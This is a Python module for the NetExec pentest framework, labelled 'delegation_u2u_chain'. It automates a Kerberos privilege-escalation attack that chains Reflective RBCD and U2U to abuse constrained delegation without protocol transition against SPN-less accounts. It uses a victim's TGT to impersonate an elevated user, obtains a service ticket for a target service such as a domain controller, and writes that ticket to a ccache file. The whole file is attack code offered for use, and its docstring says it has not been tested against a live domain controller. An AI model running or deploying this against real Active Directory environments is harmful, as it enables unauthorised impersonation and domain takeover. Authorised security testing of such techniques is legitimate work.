from nxc.helpers.misc import CATEGORY
from nxc.protocols.smb.kerberos import kerberos_delegation_u2u_chain
from impacket.krb5.ccache import CCache


class NXCModule:
    """Constrained Delegation WITHOUT Protocol Transition against SPN-less accounts.

    Executes the Reflective RBCD + U2U chain from
    https://hunio.org/security/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts/
    using the LOGIN account as the helper machine (it must hold an SPN and be
    configured in the victim's msDS-AllowedToActOnBehalfOfOtherIdentity).

    Range-test pending: mirrors impacket PR fortra/impacket#2324 mechanics, not
    yet validated against a live DC.
    """

    name = "delegation_u2u_chain"
    description = "Constrained delegation without protocol transition against SPN-less accounts (Reflective RBCD + U2U chain)"
    supported_protocols = ["smb"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    def __init__(self):
        self.context = None
        self.module_options = None

    def options(self, context, module_options):
        """VICTIM=SPN-less account trusted for delegation without protocol transition.
        TGT=path to the victim's TGT ccache (post-sacrifice).
        TARGET_SPN=the service the victim may delegate to (e.g. host/DC01.secure.local).
        IMPERSONATE=the elevated user to impersonate.
        OUT=path for the final ccache (optional).
        """
        self.context = context
        self.module_options = module_options
        for req in ("VICTIM", "TGT", "TARGET_SPN", "IMPERSONATE"):
            if req not in module_options:
                context.log.fail(f"Missing required option: {req}")
                return False
        return True

    def on_login(self, context, connection):
        victim = self.module_options["VICTIM"]
        tgt_path = self.module_options["TGT"]
        target_spn = self.module_options["TARGET_SPN"]
        impersonate = self.module_options["IMPERSONATE"]
        domain = connection.domain
        kdcHost = getattr(connection, "kdcHost", None)

        # Sanity: the victim TGT must load
        try:
            CCache.loadFile(tgt_path)
        except Exception as e:
            context.log.fail(f"Cannot load victim TGT {tgt_path}: {e}")
            return

        context.log.highlight(f"Running U2U delegation chain: {connection.username} (helper) -S4U2self-> {impersonate} -U2U-> {victim} -proxy-> {target_spn}")
        try:
            tgs = kerberos_delegation_u2u_chain(
                domain=domain,
                username=connection.username,
                password=connection.password,
                nthash=getattr(connection, "nthash", None),
                lmhash=getattr(connection, "lmhash", None),
                aesKey=getattr(connection, "aesKey", None),
                kdcHost=kdcHost,
                victim=victim,
                victim_tgt_path=tgt_path,
                impersonate=impersonate,
                target_spn=target_spn,
            )
        except Exception as e:
            context.log.fail(f"Delegation chain failed: {e}")
            return

        context.log.highlight(f"Final ST obtained for {target_spn} as {impersonate}")
        out = self.module_options.get("OUT")
        if out:
            try:
                CCache.fromTGS(
                    tgs["KDC_REP"], tgs["cipher"], tgs["sessionKey"],
                    spn=target_spn, username=impersonate, domain=domain.upper(),
                ).saveFile(out)
                context.log.highlight(f"Saved ccache: {out}")
            except Exception as e:
                context.log.fail(f"Could not save ccache: {e}")
